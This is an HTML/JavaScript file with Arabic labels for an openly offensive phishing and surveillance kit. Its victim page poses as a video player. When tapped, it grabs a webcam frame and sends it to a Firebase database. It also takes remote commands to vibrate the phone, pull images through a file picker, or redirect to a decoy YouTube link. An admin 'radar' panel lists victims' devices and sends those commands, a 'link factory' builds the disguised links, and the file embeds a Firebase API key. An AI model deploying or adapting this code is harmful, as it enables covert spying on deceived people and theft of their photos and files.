<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Gateway</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; }
        body { background: #000; color: #fff; margin: 0; font-family: sans-serif; }
        
        /* لوحة التحكم */
        #admin-panel { display: none; padding: 15px; color: var(--neon); font-family: 'Courier New', monospace; }
        .section { border: 1px solid var(--neon); padding: 12px; margin-bottom: 10px; border-radius: 5px; background: #050505; }
        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 5px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        .v-card.active { border-color: #fff; background: #111; font-weight: bold; }
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; cursor: pointer; margin-top: 5px; font-weight: bold; }
        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-bottom: 10px; box-sizing: border-box; }

        /* واجهة الضحية */
        #vic-panel { display: none; height: 100vh; width: 100vw; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; background: #000; z-index: 9999; }
        .play-btn { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
        .play-btn::after { content: ''; position: absolute; top: 22px; left: 32px; border-left: 25px solid #fff; border-top: 18px solid transparent; border-bottom: 18px solid transparent; }
    </style>
</head>
<body>

<div id="vic-panel">
    <div id="p-scr">
        <div class="play-btn" onclick="activateSession()"></div>
        <p style="margin-top:20px;">Tap to Play Video</p>
    </div>
    <div id="l-scr" style="display:none; text-align:center;">
        <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
        <p>Loading...</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
</div>

<div id="admin-panel">
    <div class="section">
        <h3>📡 الأجهزة المتصلة (الرادار)</h3>
        <div id="v-list">بانتظار المتصلين...</div>
    </div>

    <div class="section">
        <h3>🕹️ التحكم: <span id="t-name" style="color:#fff;">--</span></h3>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
            <button onclick="sendCmd('snap')">📸 سحب صورة</button>
            <button onclick="sendCmd('vibrate')" style="color:yellow; border-color:yellow;">📳 هز الهاتف</button>
            <button onclick="sendCmd('pick')" style="color:cyan; border-color:cyan;">📂 سحب ملفات</button>
            <button onclick="sendCmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
        </div>
        <button onclick="db.ref('victims').remove()" style="color:red; border-color:red; margin-top:15px;">🗑️ مسح الرادار</button>
    </div>

    <div class="section">
        <h3>⚙️ مصنع الروابط</h3>
        <input type="text" id="target-url" placeholder="رابط يوتيوب للتمويه">
        <button onclick="generateLink()">صناعة الرابط</button>
        <div id="res-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
    </div>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selectedVictimId = null;

    const urlParams = new URLSearchParams(window.location.search);
    const adminMode = urlParams.get('admin');
    const victimMode = urlParams.get('v');

    if (adminMode === "1") {
        document.getElementById('admin-panel').style.display = 'block';
        startAdmin();
    } else if (victimMode) {
        document.getElementById('vic-panel').style.display = 'flex';
        startVictim(atob(victimMode));
    } else {
        document.body.innerHTML = "<div style='background:#000; height:100vh;'></div>";
    }

    // --- وظائف الإدارة ---
    function startAdmin() {
        db.ref('victims').on('value', snapshot => {
            const list = document.getElementById('v-list');
            list.innerHTML = '';
            snapshot.forEach(child => {
                const data = child.val();
                const id = child.key;
                const isOnline = (Date.now() - data.lastSeen) < 15000;
                list.innerHTML += `<div class="v-card ${id === selectedVictimId ? 'active' : ''}" onclick="selectVictim('${id}','${data.model}')">
                    <span>${data.model}</span>
                    <span style="color:${isOnline ? '#0f0' : '#444'}">${isOnline ? '● متصل' : '● أوفلاين'}</span>
                </div>`;
            });
        });
    }

    function selectVictim(id, name) {
        selectedVictimId = id;
        document.getElementById('t-name').innerText = name;
        startAdmin(); // تحديث التحديد بصرياً
    }

    function sendCmd(type) {
        if (!selectedVictimId) return alert("اختر جهازاً أولاً من القائمة!");
        db.ref('victims/' + selectedVictimId + '/cmd').set({
            type: type,
            timestamp: Date.now()
        });
    }

    function generateLink() {
        const url = document.getElementById('target-url').value;
        if (!url) return alert("ضع رابط يوتيوب أولاً!");
        const encoded = btoa(url);
        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + encoded;
    }

    // --- وظائف الضحية ---
    let victimRef = null;
    function startVictim(target) {
        const model = (navigator.userAgent.match(/\(([^)]+)\)/) || [0, "Unknown"])[1].split(';')[0];
        victimRef = db.ref('victims').push();
        
        // تسجيل الدخول الفوري
        const updateStatus = () => victimRef.update({ model: model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
        updateStatus();
        setInterval(updateStatus, 5000);

        // الاستماع للأوامر
        db.ref('victims/' + victimRef.key + '/cmd').on('value', snapshot => {
            const cmd = snapshot.val();
            if (!cmd) return;
            if (cmd.type === 'snap') takeSnap();
            if (cmd.type === 'vibrate') navigator.vibrate([500, 200, 500]);
            if (cmd.type === 'pick') document.getElementById('f-in').click();
            if (cmd.type === 'release') window.location.href = target;
        });
    }

    async function activateSession() {
        document.getElementById('p-scr').style.display = 'none';
        document.getElementById('l-scr').style.display = 'block';
        await takeSnap();
    }

    async function takeSnap() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            await video.play();
            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            victimRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
            stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log("Camera access denied"); }
    }

    document.getElementById('f-in').onchange = (e) => {
        for (let f of e.target.files) {
            const r = new FileReader();
            r.onload = (ev) => victimRef.child('files').push(ev.target.result);
            r.readAsDataURL(f);
        }
    };
</script>
<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
